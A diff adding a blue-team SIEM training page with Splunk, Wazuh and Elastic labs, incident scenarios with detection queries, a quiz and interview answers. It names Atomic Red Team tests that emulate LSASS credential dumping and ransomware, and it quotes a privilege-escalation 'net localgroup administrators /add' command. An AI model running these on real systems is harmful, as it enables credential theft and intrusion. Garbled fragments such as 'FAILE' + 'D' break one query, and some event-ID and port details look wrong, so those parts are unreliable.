+<tr><td>SOC168 — Brute Force Attack With Splunk</td><td>SOC Simulation</td><td>Use Splunk queries to identify brute force source IPs, compromised accounts, timeline of attack, and affected systems</td></tr>
+<tr><td>SOC181 — SOC Simulation With Splunk Investigation</td><td>SOC Simulation</td><td>Full incident investigation — receive alert, query SIEM, build timeline, identify root cause, write incident report</td></tr>
+<tr><td>SOC182 — SOC Simulation With ELK Investigation</td><td>SOC Simulation</td><td>Same scenario but with ELK Stack — adapt investigation methodology to different SIEM platform</td></tr>
+<tr><td>SOC170 — Suspicious Log Clearing Activity</td><td>Alert Triage</td><td>Detect and investigate attackers clearing Windows Event Logs (EventCode 1102) — identify scope and attacker activity before logs were deleted</td></tr>
+<tr><td>Phishing Email Analysis With Logs</td><td>Investigation</td><td>Analyze proxy logs to trace user who clicked phishing link, what malware was downloaded, what data was exfiltrated</td></tr>
+<tr><td>SOC144 — Network Attacks With Splunk</td><td>SOC Simulation</td><td>Investigate IDS alerts in SIEM — correlate network alerts with Windows logs to confirm compromise</td></tr>
+</table>
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-shield-fill me-2"></i>8. CYBERDEFENDERS SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Challenge</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Description</th></tr>
+<tr><td>SIEM Investigation — Ransomware Attack</td><td>Easy</td><td>Analyze SIEM logs (Splunk) to trace ransomware execution — identify patient zero, lateral movement, data encryption timeline</td></tr>
+<tr><td>SIEM Tuning Challenge</td><td>Medium</td><td>Given 7 days of SIEM data and 500 alerts, tune 10 rules to reduce FPs by 80% while maintaining detection coverage</td></tr>
+<tr><td>SIEM Architecture Design</td><td>Hard</td><td>Design SIEM architecture for 50,000 endpoints with cloud, on-prem, and OT environments — including sizing, data flow, HA, DR</td></tr>
+<tr><td>Log Source Integration</td><td>Medium</td><td>Integrate 5 different log sources into SIEM — parse custom logs, normalize fields, create dashboards</td></tr>
+<tr><td>Correlation Rule Challenge</td><td>Hard</td><td>Build correlation rules that detect APT29 (Cozy Bear) techniques — given MITRE ATT&CK TTPs, design multi-condition rules</td></tr>
+</table>
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-github me-2"></i>9. GITHUB RESOURCES</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Repository</th><th style="color:#00d4ff;text-align:left;">Purpose</th><th style="color:#00d4ff;text-align:left;">Skills Learned</th></tr>
+<tr><td><a href="https://github.com/keraattin/Blue-Team-Roadmap" style="color:#00d4ff;" target="_blank">Blue-Team-Roadmap</a></td><td>Structured learning path for blue team skills from beginner to advanced</td><td>Career planning, skill gap identification, structured learning approach</td></tr>
+<tr><td><a href="https://github.com/cyb3rxp/awesome-soc" style="color:#00d4ff;" target="_blank">awesome-soc</a></td><td>Curated list of SOC tools, resources, training materials, and frameworks</td><td>Tool discovery, SOC best practices, industry standard references</td></tr>
+<tr><td><a href="https://github.com/SigmaHQ/sigma" style="color:#00d4ff;" target="_blank">sigma</a></td><td>Generic SIEM rule format — write once, convert to any SIEM (Splunk, KQL, EQL, QRadar, etc.)</td><td>Sigma rule writing, SIEM-agnostic detection engineering, rule conversion</td></tr>
+<tr><td><a href="https://github.com/redcanaryco/atomic-red-team" style="color:#00d4ff;" target="_blank">atomic-red-team</a></td><td>Test your detection rules with real adversarial techniques mapped to MITRE ATT&CK</td><td>Detection validation, purple team exercises, rule testing methodology</td></tr>
+<tr><td><a href="https://github.com/SwiftOnSecurity/sysmon-config" style="color:#00d4ff;" target="_blank">sysmon-config</a></td><td>Industry-standard Sysmon configuration for comprehensive Windows event logging</td><td>Sysmon setup and tuning, Windows event forensics, detection engineering</td></tr>
+<tr><td><a href="https://github.com/aboutsecurity/blueteam_homelabs" style="color:#00d4ff;" target="_blank">blueteam_homelabs</a></td><td>Blue team home lab setups — build a SOC at home with open-source tools</td><td>Lab architecture, tool deployment, hands-on practice environment design</td></tr>
+<tr><td><a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES" style="color:#00d4ff;" target="_blank">EVTX-ATTACK-SAMPLES</a></td><td>Real Windows Event Log samples from actual attacks — test your SIEM without infecting yourself</td><td>Event log analysis, attack pattern recognition, detection rule testing</td></tr>
+<tr><td><a href="https://github.com/InQuest/awesome-yara" style="color:#00d4ff;" target="_blank">awesome-yara</a></td><td>Curated list of YARA rules, tools, and resources for malware detection</td><td>YARA rule writing, malware pattern matching, IoC-based detection</td></tr>
+<tr><td><a href="https://github.com/A-poc/BlueTeam-Tools" style="color:#00d4ff;" target="_blank">BlueTeam-Tools</a></td><td>Collection of blue team tools with installation guides and usage examples</td><td>Tool proficiency, defensive toolchain integration, practical blue team skills</td></tr>
+</table>
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-laptop me-2"></i>10. HANDS-ON LABS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Beginner Lab: Splunk Free — Log Ingestion & Search</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Install Splunk Free, ingest Windows Event Logs, and perform basic searches.<br><br>
+<b>Setup:</b><br>
+1. Download Splunk Free (500 MB/day limit) from splunk.com<br>
+2. Install on Windows Server 2019 or Windows 10 VM<br>
+3. Configure inputs.conf to monitor <code>C:\Windows\System32\winevt\Logs\Security.evtx</code><br>
+4. Add to inputs.conf: <code>[WinEventLog://Security]</code> with <code>disabled = 0</code><br><br>
+<b>Step-by-Step:</b><br>
+1. <b>Ingestion check:</b> <code>index=windows sourcetype=WinEventLog:Security | stats count</code> → Should show Security events<br>
+2. <b>Failed logins:</b> <code>index=windows EventCode=4625 | stats count by Account_Name, Source_Network_Address, _time</code><br>
+3. <b>Successful logins:</b> <code>index=windows EventCode=4624 | table _time, Account_Name, Source_Network_Address, Logon_Type</code><br>
+4. <b>Create dashboard:</b> Save your query as a dashboard panel with bar chart visualization<br>
+5. <b>Schedule alert:</b> Create alert if more than 10 failed logins in 15 minutes<br><br>
+<b>Expected Results:</b> You see your own logins and failed attempts. You can identify Logon Type 2 (interactive), 3 (network), 10 (remote interactive/RDP).<br><br>
+<b>Troubleshooting:</b> No events? Check Splunk is running as Administrator (needs permissions to read event logs). Check <code>C:\Program Files\Splunk\var\log\splunk\splunkd.log</code> for errors.<br><br>
+<b>Detection Opportunities:</b> Try generating failed logins (use wrong password 15 times) — see your alert fire. Count logons per hour to establish your personal baseline.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Intermediate Lab: Wazuh SIEM — Full Deployment with Suricata Integration</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Deploy Wazuh (open-source SIEM/XDR), integrate Suricata IDS, create custom rules, and set up alerting.<br><br>
+<b>Setup:</b><br>
+1. Deploy Wazuh server on Ubuntu 22.04:<br>
+<code>curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh && sudo bash wazuh-install.sh -a</code><br>
+2. Install Wazuh agent on a Windows VM:<br>
+<code>Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.x.msi -OutFile wazuh-agent.msi<br>
+.\wazuh-agent.msi /q WAZUH_MANAGER="192.168.1.100" WAZUH_REGISTRATION_SERVER="192.168.1.100"</code><br>
+3. Install Suricata on Ubuntu:<br>
+<code>sudo apt install suricata -y<br>
+sudo suricata-update<br>
+sudo systemctl enable suricata && sudo systemctl start suricata</code><br>
+4. Configure Wazuh to read Suricata alerts:<br>
+Add to <code>/var/ossec/etc/ossec.conf</code>: <code>&lt;localfile&gt;&lt;location&gt;/var/log/suricata/eve.json&lt;/location&gt;&lt;log_format&gt;json&lt;/log_format&gt;&lt;/localfile&gt;</code><br><br>
+<b>Step-by-Step:</b><br>
+1. <b>Create custom rule:</b> Add to <code>/var/ossec/etc/rules/local_rules.xml</code> a rule detecting <code>ET MALWARE Known malware C2 pattern</code><br>
+2. <b>Trigger detection:</b> Download and run a test malware executable in the Windows VM (use EICAR test file)<br>
+3. <b>Investigate in Wazuh dashboard:</b> Check alerts tab, view full alert details, check agent inventory<br>
+4. <b>Create active response:</b> Configure Wazuh to block the source IP on the firewall when a critical alert triggers<br><br>
+<b>Expected Results:</b> Wazuh shows Suricata alerts (network-based) and Sysmon events (endpoint-based) in the same dashboard — correlated by IP and timestamp.<br><br>
+<b>Troubleshooting:</b> Agents not connecting? Check port 1515 (enrollment) and 1516 (communication) are open. Wazuh dashboard blank? Check <code>/var/ossec/logs/ossec.log</code>.<br><br>
+<b>Detection Opportunities:</b> Run a port scan from attacker VM — see Suricata alerts plus Windows firewall logs in Wazuh. Try to exfiltrate a file via DNS tunneling — see if your rules detect it.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Advanced Lab: Elastic SIEM — Detection Engineering & Threat Hunting</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Build an Elastic SIEM cluster, create detection rules from Sigma, perform a purple team exercise validating coverage.<br><br>
+<b>Setup:</b><br>
+1. Deploy Elastic Stack 8.x on Ubuntu:<br>
+<code>wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg<br>
+sudo apt-get install elasticsearch kibana elastic-agent</code><br>
+2. Configure Fleet Server to manage agents centrally<br>
+3. Deploy Elastic Agent on Windows and Linux VMs with System and Security integrations<br>
+4. Enable Elastic Security app with Detection Rules, Cases, Timelines<br><br>
+<b>Step-by-Step:</b><br>
+1. <b>Convert Sigma rules to Elastic rules:</b><br>
+<code>pip install sigma-cli<br>
+sigma convert -t elasticsearch -p default sigma/rules/windows/builtin/win_susp_log_cleared.yml</code><br>
+2. <b>Create custom detection rule in Kibana:</b><br>
+Security → Rules → Create → EQL rule → <code>sequence by host.id with maxspan=30s [process where event.type == "start" and process.name == "cmd.exe"] [network where event.type == "connection" and destination.port == 443]</code><br>
+3. <b>Execute Atomic Red Team test:</b><br>
+<code>Invoke-AtomicTest T1059.001 -TestNumbers 1</code> — PowerShell execution<br>
+4. <b>Hunt in Timeline:</b> Elastic Security → Timelines → Create new → Use KQL to find all process events with <code>powershell*.exe</code> parent process containing <code>cmd.exe</code><br>
+5. <b>Create Cases:</b> Open a case for the alert, add observable data, assign to analyst, document findings<br><br>
+<b>Expected Results:</b> Elastic Security shows coverage gaps — visualize which MITRE techniques your rules cover vs miss. The detection rule fires on the ART test.<br><br>
+<b>Troubleshooting:</b> Detection rules not firing? Check rule type (EQL vs Query), check index patterns match your data, check rule is enabled. Elastic Agent not sending data? Check <code>elastic-agent status</code> and /var/log/elastic-agent logs.<br><br>
+<b>Detection Opportunities:</b> Deploy Atomic Red Team on Windows VM, execute <code>Invoke-AtomicTest T1003.001</code> (Mimikatz) — validate LSASS access detection. Execute <code>Invoke-AtomicTest T1486</code> (ransomware simulation) — validate file encryption detection. Measure detection rate: what % of ART tests fire alerts?
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-people me-2"></i>11. SOC SCENARIOS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 1: Successful Brute Force Attack Followed by Lateral Movement</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> At 2:30 AM UTC, the SIEM triggers an alert: "Brute Force Attack — 25 failed logins from IP 91.200.100.50 against user j.smith in 3 minutes." At 2:33 AM, an alert fires: "Successful login from unusual geographic location — user j.smith from IP 91.200.100.50 (Russia)." At 3:15 AM, another alert: "Lateral movement — j.smith authenticated from DC01 to FILE01 (Event ID 4624 Logon Type 3)."<br><br>
+<b>How to Detect:</b> Query failed login attempts (EventCode 4625) grouped by source IP — the IP with the most attempts is likely the attacker. Then search for successful logins (EventCode 4624) from that same IP within 30 minutes of the failed attempts.<br><br>
+<b>Splunk Query:</b><br>
+<code>index=windows (EventCode=4625 OR EventCode=4624) Source_Network_Address="91.200.100.50"<br>
+| eval Logon_Type = case(EventCode==4625, "FAILE' + 'D", EventCode==4624, Logon_Type)<br>
+| stats values(EventCode) as Events, values(Logon_Type) as Types by _time, Account_Name, ComputerName<br>
+| sort _time</code><br><br>
+<b>How to Investigate:</b> Check if j.smith is a real employee — call them to confirm they were asleep at 2:30 AM. Review all systems j.smith accessed after the compromise. Check for scheduled tasks, service installations, or data access. Look for any tools downloaded by the attacker (check EventCode 4688 process creation).<br><br>
+<b>How to Respond:</b><br>
+1. Force password reset for j.smith and revoke all active sessions<br>
+2. Block IP 91.200.100.50 at the firewall<br>
+3. Isolate affected systems (DC01, FILE01) for forensic imaging<br>
+4. Check for persistence — new accounts, services, scheduled tasks<br>
+5. Enable MFA for j.smith and all users in the same department<br><br>
+<b>How to Document:</b> Create an incident report with timeline, affected assets, compromised account, actions taken, lessons learned. File as a Phishing/Credential Theft incident type. Recommended: require MFA for all external access.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 2: Malware C2 Beaconing Detected via DNS</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> A scheduled threat hunting query flags: "Host 10.0.1.105 made 47 DNS queries to jd83kf92.ddns.net in the past hour." This domain is DGA-like (random characters, .ddns.net TLD, registered 48 hours ago). The host is a finance department workstation.<br><br>
+<b>How to Detect:</b> Create a hunting query that counts DNS queries to newly registered domains (age &lt; 30 days) by host. Filter for high query counts to the same domain. Create baseline of normal DNS query patterns per host.<br><br>
+<b>KQL Query (Sentinel):</b><br>
+<code>let threshold = 10;<br>
+DnsEvents<br>
+| where TimeGenerated > ago(24h)<br>
+| summarize QueryCount = count() by ClientIP, Name<br>
+| where QueryCount > threshold<br>
+| join kind=inner (DnsEvents<br>
+    | where TimeGenerated > ago(24h)<br>
+    | summarize TotalByClient = dcount(Name) by ClientIP)<br>
+    on ClientIP<br>
+| where TotalByClient < 20  // Only a few domains queried = targeted communication<br>
+| sort by QueryCount desc</code><br><br>
+<b>How to Investigate:</b> Check the host's process tree at the time of DNS queries — what process made the queries? Check for suspicious processes in %TEMP%, %APPDATA%, or non-standard locations. Use Sysmon Event ID 1 to trace parent-child process chains. Extract the process binary for analysis. Check for registry persistence (EventCode 13).<br><br>
+<b>How to Respond:</b><br>
+1. Isolate the host from the network immediately (cut off C2)<br>
+2. Capture memory and disk forensics<br>
+3. Block the domain jd83kf92.ddns.net at DNS firewall<br>
+4. Search all other hosts for connections to the same domain<br>
+5. Submit the binary to VirusTotal and any sandbox<br>
+6. Determine initial infection vector (phishing? drive-by download?)<br><br>
+<b>How to Document:</b> Incident report with malware family identification, C2 infrastructure, IoCs (domain, IPs, hashes), affected hosts, data accessed, containment date/time. Submit IoCs to threat intelligence sharing platforms (ISAC, AlienVault OTX).
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 3: Privilege Escalation — Local Admin Abuse</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> The SIEM alerts on Event ID 4672 (Special Privilege Assigned to New Logon) for user j.doe on SERVER42, followed by Event ID 4688 with process <code>net.exe localgroup administrators domain\j.doe /add</code>. j.doe is a standard user who should not be a local admin. This indicates privilege escalation — either j.doe is malicious or their account is compromised.<br><br>
+<b>How to Detect:</b> Create a rule that correlates Event ID 4672 (user granted admin privileges) with Event ID 4688 (process creation) where the command contains "net" OR "net1" AND "localgroup" AND "administrators" /add".<br><br>
+<b>Splunk Query:</b><br>
+<code>index=windows (EventCode=4672 OR (EventCode=4688 CommandLine="*net*localgroup*administrators*add*"))<br>
+| transaction maxspan=60s Account_Name, ComputerName<br>
+| where mvcount(EventCode) > 1<br>
+| table _time, Account_Name, ComputerName, CommandLine, SubjectUserName</code><br><br>
+<b>How to Investigate:</b> Interview j.doe — was this intentional? Check j.doe's previous behavior — have they been sending unusual emails, accessing unusual systems? Check if j.doe's credentials were phished (check recent phishing campaign results). Check j.doe's recent logins — any from unusual IPs?<br><br>
+<b>How to Respond:</b><br>
+1. Remove j.doe from SERVER42's local admin group<br>
+2. If j.doe is compromised: reset password, revoke sessions, check all systems j.doe accessed<br>
+3. If j.doe is malicious: preserve evidence, involve HR, terminate access immediately<br>
+4. Check if the account was used to create other accounts or modify other permissions<br>
+5. Review logs for any data access after the escalation<br><br>
+<b>How to Document:</b> Insider Threat incident report. Include account activity timeline, permissions changes, affected systems, HR involvement notes. Recommend regular audit of privileged group memberships and implement approval workflow for privilege elevation.
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-question-circle me-2"></i>12. KNOWLEDGE CHECK</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Multiple Choice Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1. What does SIEM stand for?</b><br>
+a) Security Information and Event Management<br>
+b) Security Incident and Event Monitoring<br>
+c) System Information and Event Management<br>
+d) Security Intelligence and Enterprise Monitoring<br>
+<strong style="color:#00d4ff;">Answer: a) Security Information and Event Management</strong><br><br>
+
+<b>2. Which Windows Event ID indicates a successful logon?</b><br>
+a) 4625<br>
+b) 4624<br>
+c) 4688<br>
+d) 1102<br>
+<strong style="color:#00d4ff;">Answer: b) 4624</strong><br><br>
+
+<b>3. In Splunk SPL, which command is used to create a time-based chart?</b><br>
+a) chart<br>
+b) timechart<br>
+c) trend<br>
+d) timeline<br>
+<strong style="color:#00d4ff;">Answer: b) timechart</strong><br><br>
+
+<b>4. What does Sysmon Event ID 1 represent?</b><br>
+a) Network connection<br>
+b) Process creation<br>
+c) File creation<br>
+d) Registry modification<br>
+<strong style="color:#00d4ff;">Answer: b) Process creation</strong><br><br>
+
+<b>5. Which of the following is NOT a common SIEM deployment model?</b><br>
+a) On-premises<br>
+b) Cloud-based<br>
+c) Hybrid<br>
+d) Peer-to-peer distributed<br>
+<strong style="color:#00d4ff;">Answer: d) Peer-to-peer distributed</strong><br><br>
+
+<b>6. What is a False Positive (FP) in SIEM context?</b><br>
+a) Real attack that was not detected<br>
+b) Benign activity that triggered an alert<br>
+c) Malicious activity that triggered an alert<br>
+d) Alert that requires manual review<br>
+<strong style="color:#00d4ff;">Answer: b) Benign activity that triggered an alert</strong><br><br>
+
+<b>7. Which protocol is most commonly used for sending network device logs to SIEM?</b><br>
+a) SNMP<br>
+b) SMTP<br>
+c) Syslog (UDP 514)<br>
+d) HTTP<br>
+<strong style="color:#00d4ff;">Answer: c) Syslog (UDP 514)</strong><br><br>
+
+<b>8. What is the primary purpose of log normalization in SIEM?</b><br>
+a) Compress logs to save storage<br>
+b) Convert different log formats into a common schema<br>
+c) Encrypt logs for secure transmission<br>
+d) Delete duplicate log entries<br>
+<strong style="color:#00d4ff;">Answer: b) Convert different log formats into a common schema</strong><br><br>
+
+<b>9. What does MITRE ATT&CK help SIEM analysts do?</b><br>
+a) Size SIEM storage requirements<br>
+b) Map detection rules to adversary techniques<br>
+c) Configure log forwarding agents<br>
+d) Generate compliance reports<br>
+<strong style="color:#00d4ff;">Answer: b) Map detection rules to adversary techniques</strong><br><br>
+
+<b>10. Typically, what percentage of SIEM alerts are False Positives in an untuned environment?</b><br>
+a) 0-10%<br>
+b) 20-30%<br>
+c) 60-80%<br>
+d) 90-100%<br>
+<strong style="color:#00d4ff;">Answer: c) 60-80%</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Practical Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1.</b> Write a Splunk query to find all successful RDP logins (Logon Type 10) in the past 24 hours from a specific IP range (192.168.1.0/24).<br>
+<strong style="color:#00d4ff;">Answer: <code>index=windows EventCode=4624 Logon_Type=10 Source_Network_Address="192.168.1.*" | table _time, Account_Name, ComputerName, Source_Network_Address</code></strong><br><br>
+
+<b>2.</b> A user reports their account is locked. Write a query to find all failed login attempts on their account in the past hour and identify the source IPs.<br>
+<strong style="color:#00d4ff;">Answer: <code>index=windows EventCode=4625 Account_Name=jdoe earliest=-1h | stats count by Source_Network_Address | sort -count</code></strong><br><br>
+
+<b>3.</b> You need to detect a user logging in from two different geographic locations within 30 minutes (impossible travel). Describe the query logic.<br>
+<strong style="color:#00d4ff;">Answer: Collect all successful logons per user, add GeoIP to source IP, then use a transaction spanning 30 minutes per user — if two logons show different countries within the window, alert. In SPL: <code>index=windows EventCode=4624 | iplocation Source_Network_Address | transaction maxspan=30m Account_Name | where mvcount(Country) > 1</code></strong><br><br>
+
+<b>4.</b> Your SIEM is missing logs from 3 critical domain controllers. List the steps to troubleshoot this.<br>
+<strong style="color:#00d4ff;">Answer: (1) Check agent/forwarder status on the DCs, (2) Check network connectivity from DCs to SIEM server (port 9997 for Splunk), (3) Check if Windows Event Log service is running on the DCs, (4) Check if the SIEM credentials have permission to read event logs, (5) Check SIEM-side for ingestion errors in internal logs (<code>splunkd.log</code>), (6) Verify firewall rules allow the traffic</strong><br><br>
+
+<b>5.</b> Describe how you would test a new SIEM correlation rule before deploying it to production.<br>
+<strong style="color:#00d4ff;">Answer: (1) Run the query against historical data to check for false positives, (2) Execute the rule against a known dataset with both positive and negative controls, (3) Deploy in "test" mode (monitor-only, no alerting) for 7 days, (4) Review all generated alerts, classify as TP/FP, (5) Tune and retest until FP rate is under 30%, (6) Deploy to production with a low severity, gradually increase as confidence grows</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Investigation Scenarios</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Scenario A — Ransomware Detection:</b> You receive an alert: "Multiple file rename operations detected on FILE02." The SIEM shows 15,000+ Event ID 4659 (File created/renamed) in the past 5 minutes, all changing filenames to *.encrypted extension. At the same time, a process creation event shows <code>encrypt.exe</code> running from <code>C:\Users\public\</code>. What is your investigation and response plan?<br>
+<strong style="color:#00d4ff;">Answer: This is a ransomware outbreak. Immediate actions: (1) Isolate FILE02 from network (no blocking — isolate at switch level), (2) Block SMA' + 'B ports (445) at firewall to prevent spread, (3) Check if encrypt.exe has network connections (C2 or data exfiltration), (4) Identify patient zero — which host did the user log in from before the encryption started? (5) Check if ransomware source was on FILE02 or spread from another host, (6) Search all other file servers for same .encrypted pattern, (7) Preserve memory from FILE02 for forensics, (8) Activate incident response plan, (9) Determine if backups are available and clean, (10) Document every step for post-mortem</strong><br><br>
+
+<b>Scenario B — Data Exfiltration via DNS:</b> Your threat hunting query shows a workstation making 2,000 DNS queries per hour — mostly to subdomains of a single domain (exfil.example.com) with random-looking prefixes. The total data size of DNS requests is significant (50+ KB/hour in hex-encoded subdomains). How do you investigate and respond?<br>
+<strong style="color:#00d4ff;">Answer: (1) Capture live traffic from the workstation — use tcpdump or Wireshark to capture DNS queries, (2) Decode the subdomain hex: <code>echo "48656c6c6f" | xxd -r -p</code> — see if it decodes to readable data, (3) Identify the process making DNS queries via Sysmon Event ID 22 (DNS query event), (4) Check for malware on the host — suspicious processes, unsigned binaries, unusual persistence, (5) Isolate the host, (6) Check what data was exfiltrated — file access events, recently accessed documents, (7) Block the domain at DNS firewall, (8) Check other hosts for connections to same domain, (9) Report to incident response team with all findings</strong>
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Interview Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1. "Walk me through your process for investigating a SIEM alert that says 'Suspicious Outbound Connection Detected'."</b><br>
+<strong style="color:#00d4ff;">Answer: "First, I verify the alert details — source IP, destination IP, port, protocol, timestamp. I query the SIEM for all events involving that source IP in the 15 minutes before the alert to understand context (what was the user doing? what processes were running?). I check if the destination IP is known malicious via threat intel. If this is a workstation, I look for process creation events — what process made the connection? Is it a signed Microsoft binary (svchost.exe making winhttp requests = normal) or an unsigned binary from %TEMP% (suspicious). I check for DNS queries to the destination domain — is it newly registered? Does it match DGA patterns? I look for data transfers — how much data was sent? If it's small amounts regularly, it's C2 beaconing. If it's large, it's exfiltration. I check other hosts for same behavior — is this isolated or widespread? Then I recommend containment: isolate host, block IP, escalate based on findings."</strong><br><br>
+
+<b>2. "How do you decide which SIEM alerts to investigate when there are hundreds per day?"</b><br>
+<strong style="color:#00d4ff;">Answer: "I prioritize by severity and criticality. Critical/High severity alerts get immediate attention — these are the 1-5% of alerts that fire on defined malicious patterns. Next, I look for alerts on critical assets — domain controllers, financial systems, HR systems. I also prioritize alerts that are part of a pattern (same user, same source IP, multiple rules firing). I use the SIEM's risk scoring to sort the queue. I have dashboards showing alert metrics — I look for anomalies in volume (if a normally quiet rule starts firing, something changed). I batch-investigate low/medium alerts — review 10-20 at once to look for patterns. Anything that's been sitting uninvestigated for more than 4 hours gets auto-escalated in our ticketing system."</strong><br><br>
+
+<b>3. "What would you check if you noticed a critical SIEM rule stopped firing alerts?"</b><br>
+<strong style="color:#00d4ff;">Answer: "I check four things: (1) Is the log source still sending data? Check source health dashboard — if the source stopped sending logs, no rule can fire. (2) Did the log format change? If the firewall vendor updated firmware and changed field names, the rule's conditions won't match. (3) Was the rule modified? Check change history — someone might have accidentally disabled the rule or changed conditions. (4) Is the threat still active? If a C2 domain was taken down, the rule won't fire because there's no traffic. If everything looks normal, I run a manual test — generate traffic matching the rule condition (using Atomic Red Team or similar) to verify end-to-end detection works. If the test traffic doesn't trigger the rule, I know there's a technical issue with the rule logic or data pipeline."</strong>
+</div>
+
+<h6 class="text-info mt-4 mb-2"><i class="bi bi-briefcase me-2"></i>13. PORTFOLIO PROJECTS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Beginner Project: Home Lab SIEM Dashboard</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Build a personal SOC monitoring lab using Splunk Free or Wazuh at home. Monitor your own home network traffic, create dashboards, and demonstrate log analysis skills.<br><br>
+<b>Architecture:</b> Windows or Linux host running Splunk Free → Windows Event Logs from your own PC → Forward logs to Splunk → Create dashboards showing failed logins, process creation, network connections.<br><br>
+<b>Tools:</b> Splunk Free (or Wazuh), Windows Event Log, Sysmon with SwiftOnSecurity config.<br><br>
+<b>Steps:</b> (1) Install Splunk Free, (2) Configure Windows Event Log and Sysmon forwarding, (3) Create 3 dashboards: Login Activity, Process Execution, Network Connections, (4) Set up 2 alerts: Failed login threshold and New process in startup folder, (5) Write a report describing what you see for a week — what's normal, what's suspicious.<br><br>
+<b>Documentation:</b> Screenshot your dashboards. Write a 2-page report explaining: what data you collect, what your normal baseline looks like, any suspicious events you caught, your alert configurations, and lessons learned. This demonstrates: SIEM setup, log ingestion, dashboard creation, alert configuration, and analytical thinking.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Intermediate Project: Corporate SOC SIEM Migration</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Design and execute a SIEM migration plan from legacy RSA NetWitness to Splunk Enterprise for a simulated mid-size company (5,000 employees, 8,000 endpoints, 200 servers, hybrid cloud).<br><br>
+<b>Architecture:</b> Splunk Enterprise with 3 indexers, 2 search heads, deployer, heavy forwarders for log aggregation. Data sources: Windows Event Log, Sysmon, Palo Alto firewall, Cisco ASA, AWS CloudTrail, Office 365 audit logs.<br><br>
+<b>Tools:</b> Splunk Enterprise (trial), Splunk Universal Forwarder, TA (Technology Add-ons) for each data source.<br><br>
+<b>Steps:</b> (1) Create data source inventory and mapping document (what sends what, where, how), (2) Design and size Splunk architecture (license requirement: ~3GB/day), (3) Deploy Splunk Enterprise on 3 VMs using Ansible, (4) Configure forwarders on 3 simulated sources (Windows, Linux, Palo Alto VM), (5) Create 10 essential detection rules (Kerberoasting, brute force, lateral movement, ransomware, C2 beaconing, etc.), (6) Create executive dashboard showing overall SOC posture, (7) Write migration plan document: cutover strategy, rollback plan, testing methodology, training plan for analysts.<br><br>
+<b>Documentation:</b> Architecture diagram, deployment guide, rule catalog with MITRE mapping (20+ pages). This demonstrates: architecture planning, SIEM administration, detection engineering, migration project management.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Advanced Project: Detection Engineering Pipeline</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Build a complete detection engineering pipeline: Sigma → SIEM (Elastic/Splunk) → Atomic Red Team validation → MITRE ATT&CK coverage heatmap → Continuous improvement cycle.<br><br>
+<b>Architecture:</b> GitHub repo for Sigma rules → CI/CD pipeline (GitHub Actions) to convert and deploy rules → Elastic SIEM → Atomic Red Team automated testing → Coverage.json → Coverage heatmap dashboard.<br><br>
+<b>Tools:</b> Sigma CLI, Python, Elasticsearch/Kibana, Atomic Red Team (Invoke-AtomicRedTeam), MITRE ATT&CK Navigator, GitHub Actions.<br><br>
+<b>Steps:</b> (1) Fork the SigmaHQ/sigma repository, (2) Create custom rules for 10 ATT&CK techniques not covered by default, (3) Build GitHub Actions pipeline: on commit → sigma convert → deploy to Elastic via API, (4) Create testing script that runs Atomic Red Team tests for all techniques, (5) Parse test results into coverage.json, (6) Build Kibana dashboard showing coverage heatmap (green = detected, red = missed), (7) Track coverage improvement over time with CI/CD badges (e.g., "Tactics Covered: 42%"), (8) Create monthly coverage report with recommendations for new rules.<br><br>
+<b>Documentation:</b> Full pipeline documentation: architecture, setup guide, rule writing standards, testing framework, coverage metrics. Show before/after coverage percentages. This demonstrates: DevOps/SecOps, detection engineering at scale, automation, CI/CD for security, MITRE ATT&CK mastery, and systematic improvement methodology.
 </div>
 </div>
